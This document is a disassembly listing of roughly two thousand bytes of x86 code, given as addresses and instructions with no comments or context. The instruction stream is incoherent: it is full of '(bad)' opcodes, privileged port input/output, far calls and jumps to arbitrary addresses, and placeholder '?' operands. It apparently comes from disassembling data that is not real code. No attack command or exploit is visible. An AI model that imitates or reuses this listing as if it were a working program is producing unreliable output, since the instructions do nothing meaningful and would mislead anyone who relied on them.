  418494:	inc    ebx
  418495:	fwait
  418496:	xor    DWORD PTR [ebx-0x8],esi
  418499:	out    dx,al
  41849a:	lods   eax,DWORD PTR ds:[esi]
  41849b:	out    dx,eax
  41849c:	out    dx,eax
  41849d:	les    ebp,FWORD PTR [esi+0x62]
  4184a0:	dec    edi
  4184a1:	jl     0x4184ac
  4184a3:	jl     0x41843d
  4184a5:	inc    edi
  4184a6:	stos   BYTE PTR es:[edi],al
  4184a7:	scas   al,BYTE PTR es:[edi]
  4184a8:	inc    edi
  4184a9:	sar    DWORD PTR [ebp+0x752f78f4],cl
  4184af:	ins    DWORD PTR es:[edi],dx
  4184b0:	dec    edi
  4184b1:	push   es
  4184b2:	in     al,dx
  4184b3:	dec    ebx
  4184b4:	je     0x418504
  4184b6:	stc    
  4184b7:	mov    ch,0x1e
  4184b9:	jae    0x418520
  4184bb:	ja     0x418458
  4184bd:	and    edi,DWORD PTR [edx-0x4c55abec]
  4184c3:	mov    eax,ds:0x12e50a5a
  4184c8:	cmp    al,dh
  4184ca:	xchg   esp,eax
  4184cb:	lea    edx,[edx+0x516f4cdb]
  4184d1:	mov    ebp,DWORD PTR [ecx]
  4184d3:	add    edx,edx
  4184d5:	scas   al,BYTE PTR es:[edi]
  4184d6:	sub    al,BYTE PTR [ebp-0x46]
  4184d9:	jnp    0x4184e2
  4184db:	add    ah,0xc0
  4184de:	sahf   
  4184df:	scas   al,BYTE PTR es:[edi]
  4184e0:	test   al,0xa9
  4184e2:	or     dl,ah
  4184e4:	or     ch,ch
  4184e6:	xchg   esp,eax
  4184e7:	popa   
  4184e8:	pusha  
  4184e9:	fwait
  4184ea:	xor    BYTE PTR [edi+ebp*1],bl
  4184ed:	add    al,0x46
  4184ef:	xchg   esp,eax
  4184f0:	test   ch,dl
  4184f2:	push   eax
  4184f3:	add    DWORD PTR [ecx],edx
  4184f5:	addr16 in eax,0x45
  4184f8:	or     BYTE PTR [edx+0x1ded0a8a],0x6b
  4184ff:	xchg   ebx,eax
  418500:	pushw  cs
  418502:	rol    BYTE PTR ds:0xe44d3354,cl
  418508:	adc    eax,DWORD PTR [ebx-0x46]
  41850b:	popf   
  41850c:	(bad)  
  41850d:	repz loopne 0x418556
  418510:	idiv   DWORD PTR [ecx-0x4c]
  418513:	sbb    DWORD PTR [esi+eax*4+0x39dfd801],ecx
  41851a:	mov    fs,WORD PTR [esi+0x61]
  41851d:	sti    
  41851e:	shl    BYTE PTR [edx+0x6c],cl
  418521:	or     esp,esi
  418523:	sub    eax,0x2961e15f
  418528:	ret    
  418529:	pop    eax
  41852a:	push   ss
  41852b:	cmp    DWORD PTR [edx-0xbdc1305],edx
  418531:	dec    esi
  418532:	pop    esp
  418533:	adc    al,0x9
  418535:	xchg   esp,eax
  418536:	popa   
  418537:	cmc    
  418538:	movsx  edi,WORD PTR [esi-0x6f]
  41853c:	add    eax,0x747bc0d1
  418541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418542:	shr    BYTE PTR [ebp+0x5650fa97],0x35
  418549:	out    0xd1,al
  41854b:	ror    DWORD PTR [ebx+ecx*2+0x51],cl
  41854f:	or     DWORD PTR [edx-0x6e1ecefb],ecx
  418555:	push   ebx
  418556:	mov    ebx,DWORD PTR [edx]
  418558:	xor    esp,0x5b68e13d
  41855e:	in     al,0xe
  418560:	mov    bl,0x45
  418562:	(bad)  
  418563:	test   al,0xb2
  418565:	mov    ds:0x92b1ab80,al
  41856a:	mov    dl,0x66
  41856c:	arpl   WORD PTR [ecx+ebp*2+0x61f2f9ea],bx
  418573:	lock jns 0x418577
  418576:	push   es
  418577:	js     0x41858c
  418579:	inc    esp
  41857a:	cmp    BYTE PTR [ebp-0x2a],bh
  41857d:	test   DWORD PTR [ebx],ebx
  41857f:	mov    ebp,0x6bc4c4df
  418584:	mov    DWORD PTR [eax-0x51fe8e3d],esi
  41858a:	add    al,0x89
  41858c:	push   ss
  41858d:	loop   0x4185e0
  41858f:	std    
  418590:	js     0x4185f0
  418592:	or     al,0x27
  418594:	imul   ebx,DWORD PTR [edi],0xffffff84
  418597:	mul    DWORD PTR [edi]
  418599:	addr16 stc 
  41859b:	(bad)  
  41859c:	jmp    0x4185fa
  41859e:	pop    ebx
  41859f:	enter  0x6f22,0xc0
  4185a3:	jae    0x4185c6
  4185a5:	and    dl,BYTE PTR [ebp+0x0]
  4185a8:	pusha  
  4185a9:	push   esp
  4185aa:	xlat   BYTE PTR ds:[ebx]
  4185ab:	ret    0xe151
  4185ae:	pop    ebx
  4185af:	cmc    
  4185b0:	(bad)  
  4185b1:	xor    eax,0x2d49b04
  4185b6:	loopne 0x418592
  4185b8:	mov    eax,0x2f9ef8ec
  4185bd:	gs out 0xdb,eax
  4185c0:	dec    ebp
  4185c1:	xlat   BYTE PTR ds:[ebx]
  4185c2:	pop    es
  4185c3:	in     eax,0x96
  4185c5:	sub    DWORD PTR [eax-0x3161adea],ebp
  4185cb:	pop    esp
  4185cc:	jecxz  0x418583
  4185ce:	das    
  4185cf:	fnstsw WORD PTR [edi+0x505a8fe1]
  4185d5:	push   ds
  4185d6:	pushf  
  4185d7:	xlat   BYTE PTR ds:[bx]
  4185d9:	jno    0x418609
  4185db:	push   esp
  4185dc:	push   cs
  4185dd:	in     al,dx
  4185de:	xchg   edx,esi
  4185e0:	mov    WORD PTR [ebx-0x32517b0d],cs
  4185e6:	xchg   ebp,eax
  4185e7:	pop    esp
  4185e8:	imul   ebx,esp,0x6ded2021
  4185ee:	push   0xfffffffb
  4185f0:	mov    ?,WORD PTR [esp+ebp*2-0x27c32368]
  4185f7:	scas   al,BYTE PTR es:[edi]
  4185f8:	cmp    eax,DWORD PTR [ebx-0x3cfe917c]
  4185fe:	mov    edi,0xc22e08b0
  418603:	fistp  QWORD PTR [eax]
  418605:	jge    0x4185ee
  418607:	stos   DWORD PTR es:[edi],eax
  418608:	xchg   ecx,eax
  418609:	(bad)  
  41860a:	das    
  41860b:	push   0x3
  41860d:	outs   dx,BYTE PTR ds:[esi]
  41860e:	test   cl,cl
  418610:	push   esp
  418611:	aam    0xf4
  418613:	sbb    al,0x4a
  418615:	retf   0xfe84
  418618:	inc    ebp
  418619:	ds jl  0x4185db
  41861c:	push   0xfffffff7
  41861e:	push   0xff56ec7b
  418623:	scas   al,BYTE PTR es:[edi]
  418624:	js     0x41864b
  418626:	ja     0x418641
  418628:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418629:	out    0x93,eax
  41862b:	adc    dh,BYTE PTR [ebp-0xf]
  41862e:	call   0x3529fe99
  418633:	aaa    
  418634:	jo     0x418694
  418636:	push   esp
  418637:	push   ebx
  418638:	jne    0x418661
  41863a:	jl     0x418639
  41863c:	pop    eax
  41863d:	loop   0x4185d3
  41863f:	cmp    DWORD PTR [edx+0x5f],ebx
  418642:	scas   al,BYTE PTR es:[edi]
  418643:	leave  
  418644:	call   0x9f3d:0x419138d9
  41864b:	(bad)  
  41864c:	push   ss
  41864d:	and    edx,DWORD PTR [esi-0x1e855e46]
  418653:	aad    0xe1
  418655:	xchg   ebx,eax
  418656:	or     esi,DWORD PTR [ebx]
  418658:	adc    eax,DWORD PTR [ecx]
  41865a:	add    BYTE PTR [eax],ch
  41865c:	lahf   
  41865d:	pop    ss
  41865e:	inc    ebx
  41865f:	shl    DWORD PTR [ecx+0x45e9f0b9],1
  418665:	nop
  418666:	jp     0x4185f1
  418668:	inc    esp
  418669:	mov    WORD PTR [eax+esi*4+0x64],ss
  41866d:	cld    
  41866e:	pop    edx
  41866f:	adc    bh,BYTE PTR [ebx]
  418671:	scas   al,BYTE PTR es:[edi]
  418672:	(bad)  
  418674:	mov    ch,0x3a
  418676:	lea    edi,[edi+ecx*2+0x73]
  41867a:	ds call 0x6873:0x9d7f49f4
  418682:	jne    0x418686
  418684:	cli    
  418685:	add    al,BYTE PTR [esi]
  418687:	jo     0x418646
  418689:	aas    
  41868a:	rcr    BYTE PTR [ebx],0xd4
  41868d:	call   0xfa12a0c8
  418692:	mov    edi,0x4af1162f
  418697:	imul   esp,DWORD PTR [edi],0x86440d98
  41869d:	jns    0x418649
  41869f:	or     al,0xe9
  4186a1:	inc    eax
  4186a2:	pop    edi
  4186a3:	pop    edi
  4186a4:	cld    
  4186a5:	jb     0x418689
  4186a7:	mov    al,ds:0xa03d3b1c
  4186ac:	call   0x8df255d
  4186b1:	loop   0x4186d4
  4186b3:	push   eax
  4186b4:	sar    BYTE PTR [esi],0x44
  4186b7:	inc    edx
  4186b8:	jae    0x4186fd
  4186ba:	push   ecx
  4186bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186bc:	jbe    0x418657
  4186be:	pop    esp
  4186bf:	mov    ?,WORD PTR [eax+0x307a2de7]
  4186c5:	inc    edx
  4186c6:	fcmove st,st(5)
  4186c8:	fmul   st(0),st
  4186ca:	popa   
  4186cb:	jmp    0x4186cb
  4186cd:	cmc    
  4186ce:	xchg   ebp,eax
  4186cf:	sbb    al,BYTE PTR cs:[edi]
  4186d2:	mov    al,0xda
  4186d4:	lahf   
  4186d5:	shl    DWORD PTR [ebx+0x61],0x6b
  4186d9:	ins    BYTE PTR es:[edi],dx
  4186da:	dec    esp
  4186db:	jmp    DWORD PTR [edx+esi*4]
  4186de:	inc    eax
  4186df:	sbb    BYTE PTR [eax+0x67f0c4c5],dl
  4186e5:	(bad)  
  4186e6:	mov    eax,ds:0x2b9b575d
  4186eb:	pop    eax
  4186ec:	mov    bl,0x6c
  4186ee:	sbb    eax,0x1433c5a5
  4186f3:	mov    esi,0x2fabb963
  4186f8:	shl    BYTE PTR [esi-0xdf7375d],1
  4186fe:	or     al,0x81
  418700:	pop    edi
  418701:	icebp  
  418702:	xchg   esi,edx
  418704:	pop    esp
  418705:	(bad)  
  418706:	pop    ebx
  418707:	inc    eax
  418708:	call   DWORD PTR [ebp-0x1305fc84]
  41870e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41870f:	pop    ss
  418710:	sbb    BYTE PTR [edi],cl
  418712:	push   cs
  418713:	retf   0x575
  418716:	je     0x4186a4
  418718:	test   BYTE PTR [edi+0x42f3b6dd],0x9b
  41871f:	xor    BYTE PTR [esi-0x7de31d77],cl
  418725:	nop
  418726:	lods   eax,DWORD PTR ds:[esi]
  418727:	push   eax
  418728:	retf   
  418729:	or     ch,cl
  41872b:	(bad)  
  41872c:	arpl   WORD PTR [ebx+0x72],bx
  41872f:	cmp    al,dh
  418731:	icebp  
  418732:	(bad)  
  418734:	sar    ah,cl
  418736:	int3   
  418737:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418738:	mov    eax,ebp
  41873a:	adc    BYTE PTR [eax],0xae
  41873d:	jnp    0x4186d6
  41873f:	ret    0x9ba3
  418742:	add    dh,BYTE PTR [edi+0x42]
  418745:	xchg   ebx,eax
  418746:	dec    ebp
  418747:	ja     0x4186f1
  418749:	fist   DWORD PTR [esi-0x5d]
  41874c:	xchg   ecx,eax
  41874d:	and    edx,DWORD PTR [edx-0x6a]
  418750:	js     0x418763
  418752:	mov    eax,0xad5843da
  418757:	adc    bh,bh
  418759:	pop    esi
  41875a:	rcr    BYTE PTR [ebx-0x5a],1
  41875d:	jne    0x41871a
  41875f:	fild   WORD PTR [ebp-0x101f8a25]
  418765:	pop    ds
  418766:	inc    ebp
  418767:	not    BYTE PTR [eax+0x35]
  41876a:	adc    ebx,DWORD PTR [ebp+0x62]
  41876d:	mov    ds:0x2e9d8d25,al
  418772:	add    eax,0xd0f91993
  418777:	int    0xd1
  418779:	inc    ebx
  41877a:	push   es
  41877b:	repz in al,dx
  41877d:	inc    BYTE PTR [ebp-0x575b753d]
  418783:	fidiv  DWORD PTR [edx]
  418785:	sbb    eax,DWORD PTR [ebx+0x67]
  418788:	lods   al,BYTE PTR ds:[esi]
  418789:	sbb    eax,0x4f70061c
  41878f:	ja     0x41876e
  418791:	nop
  418792:	mov    edi,0x19952550
  418797:	push   ebx
  418798:	iret   
  418799:	pushf  
  41879a:	inc    ecx
  41879b:	xchg   edx,eax
  41879c:	jecxz  0x41871e
  41879e:	call   0xe84c0ed5
  4187a3:	mov    esp,?
  4187a5:	ins    BYTE PTR es:[edi],dx
  4187a6:	neg    esp
  4187a8:	mov    edi,0x2d2c6da1
  4187ad:	aad    0x93
  4187af:	cmc    
  4187b0:	pop    edi
  4187b1:	inc    esi
  4187b2:	ins    BYTE PTR es:[edi],dx
  4187b3:	inc    edx
  4187b4:	sbb    DWORD PTR [eax+edi*2+0x2ab66b1b],ebx
  4187bb:	or     DWORD PTR [eax+0x6],edi
  4187be:	aad    0xc1
  4187c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187c1:	shl    BYTE PTR [eax+0x5d291ff1],cl
  4187c7:	rcl    DWORD PTR [ecx],0x36
  4187ca:	sbb    edx,eax
  4187cc:	mov    esi,0xfa7075de
  4187d1:	jge    0x4187d2
  4187d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187d4:	xchg   ecx,eax
  4187d5:	mov    ebx,0xad8339fa
  4187da:	sub    BYTE PTR [ebx+0x7c75ebd9],al
  4187e0:	sti    
  4187e1:	mov    edx,0x60185d50
  4187e6:	xor    esp,ebp
  4187e8:	push   ds
  4187e9:	push   ebp
  4187ea:	pop    edi
  4187eb:	(bad)  
  4187ed:	push   cs
  4187ee:	or     esp,ecx
  4187f0:	xchg   esi,eax
  4187f1:	inc    ebp
  4187f2:	sub    dh,BYTE PTR [ebp-0x15e571da]
  4187f8:	dec    eax
  4187f9:	int    0x3d
  4187fb:	rcr    bl,cl
  4187fd:	xchg   esp,eax
  4187fe:	scas   al,BYTE PTR es:[edi]
  4187ff:	shl    DWORD PTR [esi],0xda
  418802:	rcr    BYTE PTR ds:0xe4c622cb,0xaa
  418809:	inc    eax
  41880a:	in     al,0xbe
  41880c:	cld    
  41880d:	or     eax,0x92b0ab2c
  418812:	jle    0x41885f
  418814:	pop    ebx
  418815:	push   esp
  418816:	aas    
  418817:	xchg   edx,eax
  418818:	sahf   
  418819:	adc    BYTE PTR [esi+0x3],ch
  41881c:	jo     0x4187de
  41881e:	and    bh,ch
  418820:	fldenv [ecx]
  418822:	cmc    
  418823:	push   ebx
  418824:	imul   esp,DWORD PTR ds:0x844c9831,0x1c
  41882b:	repnz stc 
  41882d:	fcom   DWORD PTR [ebp+0x22f3deba]
  418833:	pmaxsw mm4,mm7
  418836:	adc    al,0xa5
  418838:	lods   eax,DWORD PTR ds:[esi]
  418839:	xchg   ebp,eax
  41883a:	dec    edi
  41883b:	add    dl,BYTE PTR [eax-0x26d9ac7c]
  418841:	add    al,0xcd
  418843:	loopne 0x4188a3
  418845:	add    eax,0xcef19c55
  41884a:	mov    esp,0x622ab19e
  41884f:	inc    edi
  418850:	fnsave [eax]
  418852:	add    BYTE PTR [ebx*1+0x6c14685d],bh
  418859:	or     eax,0x66079d0b
  41885e:	pop    ecx
  41885f:	mov    dh,0x2d
  418861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418862:	scas   eax,DWORD PTR es:[edi]
  418863:	xchg   edx,eax
  418864:	lds    edi,FWORD PTR [ebx]
  418866:	jp     0x418884
  418868:	jno    0x418886
  41886a:	pop    ss
  41886b:	mov    bl,BYTE PTR [edi+0x4b696ae1]
  418871:	rol    ebx,0xd
  418874:	fstp   QWORD PTR [eax-0x4e]
  418877:	stc    
  418878:	aad    0x67
  41887a:	call   0xa6f9:0x7ced06bc
  418881:	(bad)  
  418882:	in     eax,dx
  418883:	add    cl,BYTE PTR [eax-0x51]
  418886:	call   0xcf844db9
  41888b:	pusha  
  41888c:	push   cs
  41888d:	mov    cl,0xdf
  41888f:	or     di,0x47e3
  418894:	xchg   ebx,eax
  418895:	inc    esp
  418896:	mov    edx,0x34b3e852
  41889b:	rcr    DWORD PTR [esi+0x10],1
  41889e:	dec    ecx
  41889f:	fs or  eax,0xaf6854b7
  4188a5:	fcomp  QWORD PTR [edx]
  4188a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188a8:	mov    eax,0x36ee1bc
  4188ad:	mov    dl,0x18
  4188af:	xor    cl,BYTE PTR [esi+ebx*8+0x3ba6ea47]
  4188b6:	sbb    BYTE PTR [ebp+0x43],0x36
  4188ba:	pop    edi
  4188bb:	aad    0xea
  4188bd:	(bad)  
  4188be:	out    dx,al
  4188bf:	out    0xdc,al
  4188c1:	pinsrw mm2,WORD PTR [edi-0x28],0x59
  4188c6:	es push eax
  4188c8:	bound  ebx,QWORD PTR [esi]
  4188ca:	fistp  DWORD PTR [ebx-0x54157f19]
  4188d0:	lds    esp,FWORD PTR [esi+0x6]
  4188d3:	icebp  
  4188d4:	cmp    edi,DWORD PTR [eax]
  4188d6:	aas    
  4188d7:	mov    edx,0x2a5c4293
  4188dc:	push   ds
  4188dd:	loop   0x4188a1
  4188df:	mov    bh,0xee
  4188e1:	mov    ecx,0x9786ebc1
  4188e6:	xchg   esp,eax
  4188e7:	mov    BYTE PTR [esi],bh
  4188e9:	cdq    
  4188ea:	mov    dl,0x95
  4188ec:	pop    ecx
  4188ed:	dec    esi
  4188ee:	pop    es
  4188ef:	dec    edi
  4188f0:	push   0x2e7f6ac8
  4188f5:	xchg   esp,eax
  4188f6:	adc    al,0x51
  4188f8:	imul   edx,DWORD PTR [edi],0x26
  4188fb:	sbb    bl,BYTE PTR [esp+edi*1-0xd55d12e]
  418902:	mov    ebx,0x6f866ce
  418907:	cmp    DWORD PTR [esi],ebx
  418909:	dec    esp
  41890a:	call   0x8cf9f8ac
  41890f:	pop    ss
  418910:	xchg   edi,eax
  418911:	aas    
  418912:	xlat   BYTE PTR ds:[ebx]
  418913:	pushf  
  418914:	pop    esp
  418915:	je     0x4188ce
  418917:	sub    BYTE PTR gs:[esi+0x74],cl
  41891b:	and    bh,BYTE PTR [ebp-0x65]
  41891e:	dec    eax
  41891f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418920:	into   
  418921:	(bad)  
  418922:	xor    eax,0xd8900dfa
  418927:	popa   
  418928:	mov    ecx,0x1be9dd7f
  41892d:	xor    al,0x66
  41892f:	sub    bh,cl
  418931:	jnp    0x4188c1
  418933:	pop    ss
  418934:	into   
  418935:	push   0xffffffff
  418937:	dec    ecx
  418938:	inc    ebx
  418939:	jno    0x4188fb
  41893b:	xchg   edx,eax
  41893c:	push   0x1c
  41893e:	or     al,0x16
  418940:	pop    eax
  418941:	call   0xd596:0x84189404
  418948:	jecxz  0x418913
  41894a:	jmp    0x4188d2
  41894c:	or     BYTE PTR [ebx*2-0x59814d19],cl
  418953:	mov    ds:0x89945fbc,al
  418958:	iret   
  418959:	xchg   ecx,eax
  41895a:	pop    edx
  41895b:	adc    al,0x4f
  41895d:	mov    BYTE PTR [ecx+eax*1-0x79d58745],bh
  418964:	rcl    BYTE PTR [esi+0x7e8f71fd],1
  41896a:	repz pop ecx
  41896c:	test   al,0x2e
  41896e:	arpl   WORD PTR [esi+0x49],ax
  418971:	scas   al,BYTE PTR es:[edi]
  418972:	rcr    BYTE PTR [esi+eiz*2],1
  418975:	pop    esi
  418976:	stc    
  418977:	xor    al,0x32
  418979:	pop    esp
  41897a:	fnstsw WORD PTR [edx+0x28b159c0]
  418980:	mov    esp,0xd891ad0
  418985:	mov    eax,ds:0x732ecc2f
  41898a:	push   ecx
  41898b:	add    eax,DWORD PTR [eax+0x1e5086e5]
  418991:	mov    eax,cs:0x153bebe6
  418997:	xchg   esp,eax
  418998:	fcom   st(7)
  41899a:	stc    
  41899b:	(bad)  
  41899c:	mov    esp,0xd95d81d2
  4189a1:	sbb    BYTE PTR [ecx-0x4886c73d],0xe9
  4189a8:	test   eax,0xc57b3415
  4189ad:	jae    0x418a07
  4189af:	or     eax,0x67
  4189b2:	push   esp
  4189b3:	mov    DWORD PTR [eax],edi
  4189b5:	iret   
  4189b6:	retf   0x950
  4189b9:	or     esp,DWORD PTR [eax-0x174be7e6]
  4189bf:	mov    eax,0x83231392
  4189c4:	(bad)  
  4189c5:	dec    esi
  4189c6:	lods   eax,DWORD PTR ds:[esi]
  4189c7:	add    al,0x68
  4189c9:	dec    ecx
  4189ca:	push   eax
  4189cb:	dec    ebp
  4189cc:	loope  0x4189fe
  4189ce:	jnp    0x418982
  4189d0:	or     DWORD PTR [ebp+0x7c94feee],edi
  4189d6:	sub    cl,BYTE PTR [ecx+ecx*2-0x29]
  4189da:	dec    esp
  4189db:	arpl   WORD PTR [ebx+edx*4-0x2d1d606b],ax
  4189e2:	arpl   WORD PTR [edx+0x77c0bea6],si
  4189e8:	add    cl,bh
  4189ea:	ins    DWORD PTR es:[edi],dx
  4189eb:	push   edi
  4189ec:	outs   dx,BYTE PTR ds:[esi]
  4189ed:	cwde   
  4189ee:	and    eax,0x5f84c91d
  4189f3:	mov    dl,0xe0
  4189f5:	mov    ebx,edx
  4189f7:	fcom   st(4)
  4189f9:	fisub  WORD PTR [ecx-0x2802de9e]
  4189ff:	bound  edx,QWORD PTR [ecx+0x78]
  418a02:	mov    ds:0x2a15c6c7,eax
  418a07:	aaa    
  418a08:	ds fdivp st(2),st
  418a0b:	fwait
  418a0c:	xlat   BYTE PTR ds:[ebx]
  418a0d:	dec    edx
  418a0e:	repnz xchg ebx,eax
  418a10:	loopne 0x418a74
  418a12:	mov    dh,0x8a
  418a14:	inc    ebp
  418a15:	std    
  418a16:	cmp    al,0xd0
  418a18:	inc    esp
  418a19:	jbe    0x4189c3
  418a1b:	js     0x418a78
  418a1d:	adc    eax,0x53bc5336
  418a22:	hlt    
  418a23:	jge    0x4189ab
  418a25:	add    al,0xe9
  418a27:	add    ah,ch
  418a29:	jo     0x4189d2
  418a2b:	fs repz dec ecx
  418a2e:	je     0x418a83
  418a30:	leave  
  418a31:	mov    edx,0x66564969
  418a36:	sub    edx,DWORD PTR [ecx-0x2a]
  418a39:	or     BYTE PTR [esi],0x7d
  418a3c:	mov    ecx,0x42cfa737
  418a41:	(bad)  
  418a42:	push   esi
  418a43:	cmp    al,BYTE PTR [edx]
  418a45:	dec    ecx
  418a46:	loopne 0x418a16
  418a48:	jb     0x418a0a
  418a4a:	js     0x4189f8
  418a4c:	repnz into 
  418a4e:	out    0xa6,eax
  418a50:	xchg   esi,eax
  418a51:	loope  0x4189fc
  418a53:	pop    eax
  418a54:	cmp    DWORD PTR [edx+edx*1],esi
  418a57:	(bad)  
  418a59:	sub    cl,bh
  418a5b:	aaa    
  418a5c:	loopne 0x418a80
  418a5e:	sub    DWORD PTR ds:0x40071e17,edx
  418a64:	inc    eax
  418a65:	mov    ds:0x44691398,eax
  418a6a:	mov    BYTE PTR [eax+0x26],bl
  418a6d:	aad    0x63
  418a6f:	test   al,0xd5
  418a71:	stos   BYTE PTR es:[edi],al
  418a72:	xor    eax,0xa7dc327f
  418a77:	test   al,0x9
  418a79:	aaa    
  418a7a:	jbe    0x418ad4
  418a7c:	call   0x2a894ce9
  418a81:	clc    
  418a82:	adc    ebp,DWORD PTR [ebx]
  418a84:	in     eax,dx
  418a85:	sub    eax,0x3f0699ed
  418a8a:	cs icebp 
  418a8c:	fcomp  DWORD PTR [eax]
  418a8e:	in     eax,dx
  418a8f:	pop    esp
  418a90:	es ja  0x418a1c
  418a93:	add    DWORD PTR [ecx-0x13],edx
  418a96:	cmp    eax,0x20bd8fc8
  418a9b:	fxam   
  418a9d:	xchg   esp,eax
  418a9e:	int    0x0
  418aa0:	sbb    cl,bl
  418aa2:	sub    al,0x4d
  418aa4:	pop    ss
  418aa5:	pop    edx
  418aa6:	(bad)  [edi-0x31e7cfb8]
  418aac:	push   es
  418aad:	xor    bh,ah
  418aaf:	push   0x91209916
  418ab4:	sub    al,0xf0
  418ab6:	or     bl,BYTE PTR [ebx+ebx*4+0x32]
  418aba:	pop    esp
  418abb:	arpl   bx,bx
  418abd:	mov    BYTE PTR [edx-0x606bdb66],ah
  418ac3:	adc    BYTE PTR [edx],dl
  418ac5:	dec    ebp
  418ac6:	add    al,0x6d
  418ac8:	cmp    eax,0xf45854b7
  418acd:	and    esp,DWORD PTR [edi]
  418acf:	(bad)  
  418ad0:	iret   
  418ad1:	mov    ah,0xd5
  418ad3:	popf   
  418ad4:	jle    0x418b38
  418ad6:	xchg   ecx,eax
  418ad7:	cli    
  418ad8:	popf   
  418ad9:	(bad)  
  418ada:	in     al,0x9b
  418adc:	mov    ds:0x78d9360a,al
  418ae1:	rol    DWORD PTR [ebx-0xb],cl
  418ae4:	pop    ds
  418ae5:	sub    al,0x4f
  418ae7:	add    eax,0x294a89cf
  418aec:	push   es
  418aed:	inc    eax
  418aee:	inc    ebx
  418aef:	inc    esp
  418af0:	aaa    
  418af1:	jmp    0x418aa9
  418af3:	(bad)  
  418af4:	jg     0x418abd
  418af6:	xchg   edi,eax
  418af7:	cdq    
  418af8:	adc    DWORD PTR [ebx-0x5b],ebp
  418afb:	pop    ecx
  418afc:	fist   WORD PTR [ecx-0x71]
  418aff:	rcr    DWORD PTR [ebx],1
  418b01:	rcl    BYTE PTR [ebp+0x47],1
  418b04:	mov    ah,0x79
  418b06:	mov    ah,0xd1
  418b08:	mov    al,0x64
  418b0a:	sti    
  418b0b:	inc    esp
  418b0c:	in     eax,dx
  418b0d:	jecxz  0x418a96
  418b0f:	add    eax,0x85512349
  418b14:	cmp    DWORD PTR [ecx],0x73fea906
  418b1a:	pop    es
  418b1b:	sti    
  418b1c:	inc    edx
  418b1d:	jmp    0x757b94f8
  418b22:	jmp    0x418acc
  418b24:	int3   
  418b25:	popa   
  418b26:	mov    ch,0x91
  418b28:	pop    es
  418b29:	dec    edi
  418b2a:	mov    ecx,0x6ff8490b
  418b2f:	mov    al,ds:0x54431bc3
  418b34:	pop    ecx
  418b35:	in     al,dx
  418b36:	std    
  418b37:	fimul  DWORD PTR [edi+ecx*2]
  418b3a:	add    eax,ecx
  418b3c:	push   cs
  418b3d:	out    dx,eax
  418b3e:	sbb    ah,BYTE PTR [edi+0x4d76133a]
  418b44:	and    eax,0xe529b158
  418b49:	inc    esp
  418b4a:	jecxz  0x418b4c
  418b4c:	neg    DWORD PTR [ecx]
  418b4e:	xchg   ecx,eax
  418b4f:	or     ch,BYTE PTR [ecx]
  418b51:	repnz cmp BYTE PTR [ecx+0x3],bl
  418b55:	daa    
  418b56:	shl    DWORD PTR [ebx],0x84
  418b59:	pop    ds
  418b5a:	push   cs
  418b5b:	call   0xfb4a7c4
  418b60:	push   edi
  418b61:	mov    eax,ds:0xd9948826
  418b66:	sub    dh,al
  418b68:	pop    ss
  418b69:	(bad)  
  418b6b:	dec    ebp
  418b6c:	clc    
  418b6d:	adc    eax,0x8bd2e06
  418b72:	push   ss
  418b73:	xor    eax,0xc810a86b
  418b78:	mov    ds:0x1d5c83a0,al
  418b7d:	push   0x91912e6b
  418b82:	pop    ebp
  418b83:	push   esi
  418b84:	jae    0x418bb6
  418b86:	or     dh,bl
  418b88:	repnz and esp,ecx
  418b8b:	cwde   
  418b8c:	mov    eax,0x693ba49e
  418b91:	in     eax,dx
  418b92:	scas   eax,DWORD PTR es:[edi]
  418b93:	test   al,0x34
  418b95:	popf   
  418b96:	dec    edx
  418b97:	xchg   ebx,eax
  418b98:	scas   al,BYTE PTR es:[edi]
  418b99:	pushf  
  418b9a:	imul   ecx,eax,0x8b4ac737
  418ba0:	jp     0x418be4
  418ba2:	fiadd  DWORD PTR [esi+esi*8+0x33ada440]
  418ba9:	jle    0x418b99
  418bab:	sbb    dh,dl
  418bad:	xor    eax,DWORD PTR [eax]
  418baf:	out    0xa7,eax
  418bb1:	mov    ds:0x36ab01e5,eax
  418bb6:	outs   dx,DWORD PTR ds:[esi]
  418bb7:	jmp    0x418c21
  418bb9:	push   ebx
  418bba:	cdq    
  418bbb:	jne    0x418bd9
  418bbd:	test   BYTE PTR [ebx+0x12],bl
  418bc0:	xor    eax,0xf44a27d
  418bc5:	mov    al,0x4c
  418bc7:	dec    ebp
  418bc8:	jmp    0x93d0:0x76167d71
  418bcf:	pop    edi
  418bd0:	xor    eax,0xa2d0c910
  418bd5:	xchg   esi,eax
  418bd6:	popa   
  418bd7:	repnz xor esp,DWORD PTR [esi+0x17a84178]
  418bde:	push   edi
  418bdf:	shr    BYTE PTR [esp+ebp*4-0x9bbcb5],0x1c
  418be7:	lods   al,BYTE PTR ds:[esi]
  418be8:	inc    esi
  418be9:	lods   eax,DWORD PTR ds:[esi]
  418bea:	lahf   
  418beb:	inc    ebp
  418bec:	enter  0x5dda,0xb3
  418bf0:	cli    
  418bf1:	addr16 pop edi
  418bf3:	punpckldq mm1,DWORD PTR [edi]
  418bf6:	add    al,0xa0
  418bf8:	call   0x9051:0x48ce79ee
  418bff:	pop    ebp
  418c00:	mov    dh,0x9b
  418c02:	iret   
  418c03:	into   
  418c04:	cli    
  418c05:	loop   0x418c76
  418c07:	stc    
  418c08:	mov    cl,0x66
  418c0a:	sub    ecx,DWORD PTR [ebp+ebx*4-0x3a968532]
  418c11:	jmp    0x260768a6
  418c16:	les    si,DWORD PTR [esi-0x3e]
  418c1a:	(bad)  
  418c1b:	jp     0x418bf7
  418c1d:	or     BYTE PTR [esi-0x4d],ah
  418c20:	cmc    
  418c21:	retf   
  418c22:	ret    
  418c23:	add    cl,dl
  418c25:	fucomp st(3)
  418c27:	bound  ebp,QWORD PTR [eax+edx*4+0x1530b3f6]
  418c2e:	push   edi
  418c2f:	sbb    DWORD PTR [esi+esi*2+0x17b2a174],ebx
  418c36:	inc    esi
  418c37:	mov    bh,0x6e
  418c39:	or     eax,0x574c2cdc
  418c3e:	xor    bl,dh
  418c40:	mov    dh,0x2a
  418c42:	test   al,0x93
